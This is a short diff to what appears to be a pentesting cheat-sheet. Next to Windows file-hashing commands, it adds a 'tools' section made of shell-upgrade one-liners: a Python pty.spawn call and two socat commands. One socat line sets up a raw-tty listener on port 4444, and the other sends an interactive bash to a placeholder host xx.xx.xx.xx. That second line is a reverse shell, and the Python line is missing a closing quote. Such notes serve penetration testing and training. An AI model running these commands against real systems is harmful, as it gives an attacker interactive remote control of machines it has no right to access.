@@ -16,3 +16,13 @@
     certutil -hashfile file SHA1
     fciv.exe # file checksum and integrity verifier
     ```
+
+# tools
+    - pty
+    ```
+    python -c 'import pty;  pty.spawn("/bin/bash")
+
+    socat file:'tty',raw,echo=0 tcp-listen:4444
+
+    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:xx.xx.xx.xx:4444
+    ```
